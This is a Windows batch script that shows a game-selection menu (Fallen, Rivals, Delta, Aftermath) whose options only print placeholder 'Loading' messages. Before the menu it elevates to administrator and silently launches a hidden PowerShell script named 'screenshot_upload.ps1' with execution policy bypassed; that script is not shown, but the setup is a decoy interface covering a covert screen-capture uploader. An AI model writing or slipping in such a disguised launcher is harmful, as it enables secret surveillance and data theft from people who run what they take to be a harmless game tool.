@echo off
:: Check for admin rights
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb runAs"
    exit /b
)

:: Set console properties for better appearance
title Menu Interface
color 0F
mode con: cols=80 lines=25

:: Start the PowerShell script in background (hidden)
start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0\screenshot_upload.ps1"

:MAIN_MENU
cls
echo.
echo [1] Fallen
echo [2] Rivals  
echo [3] Delta
echo [4] Aftermath
echo.
echo [+] Enter Choice:
echo.

set /p choice="Choice: "

if "%choice%"=="1" goto FALLEN
if "%choice%"=="2" goto RIVALS
if "%choice%"=="3" goto DELTA
if "%choice%"=="4" goto AFTERMATH

echo Invalid choice. Please try again.
timeout /t 2 >nul
goto MAIN_MENU

:FALLEN
cls
echo.
echo Loading Fallen...
echo.
:: Add your Fallen-specific commands here
timeout /t 3 >nul
goto MAIN_MENU

:RIVALS
cls
echo.
echo Loading Rivals...
echo.
:: Add your Rivals-specific commands here
timeout /t 3 >nul
goto MAIN_MENU

:DELTA
cls
echo.
echo Loading Delta...
echo.
:: Add your Delta-specific commands here
timeout /t 3 >nul
goto MAIN_MENU

:AFTERMATH
cls
echo.
echo Loading Aftermath...
echo.
:: Add your Aftermath-specific commands here
timeout /t 3 >nul
goto MAIN_MENU